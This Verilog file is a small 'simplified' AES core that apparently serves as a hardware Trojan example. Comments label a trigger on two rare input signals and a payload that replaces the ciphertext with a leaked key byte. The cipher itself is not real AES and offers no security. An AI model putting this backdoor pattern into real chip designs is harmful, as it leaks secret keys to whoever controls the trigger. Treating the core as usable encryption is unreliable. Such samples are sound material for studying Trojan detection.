// Simplified AES Core with potential Trojan
module aes_core (
    input clk,
    input rst,
    input [127:0] plaintext,
    input [127:0] key,
    input start,
    output reg [127:0] ciphertext,
    output reg done,
    // Rare signals that could trigger a Trojan
    input rare_signal1,
    input rare_signal2
);

    reg [3:0] round;
    reg [127:0] state;
    reg [127:0] round_key;
    
    // Internal Trojan trigger
    wire trojan_trigger = rare_signal1 & rare_signal2;
    
    // Key schedule (simplified)
    always @(posedge clk) begin
        if (rst) begin
            round_key <= key;
            round <= 0;
            done <= 0;
        end else if (start) begin
            round_key <= {round_key[66:0], round_key[127:67]};
            round <= round + 1;
        end
    end
    
    // Main encryption round
    always @(posedge clk) begin
        if (rst) begin
            state <= 0;
            ciphertext <= 0;
        end else if (start) begin
            state <= plaintext ^ round_key;
            
            // Normal AES operation (simplified)
            if (!trojan_trigger) begin
                ciphertext <= state ^ round_key;
            end
            
            // Trojan payload - leaks key when rare signals are active
            if (trojan_trigger) begin
                ciphertext[7:0] <= key[7:0];  // Leak key byte
                ciphertext[127:8] <= 120'b0;  // Clear other bits
            end
            
            if (round == 10) done <= 1;
        end
    end
endmodule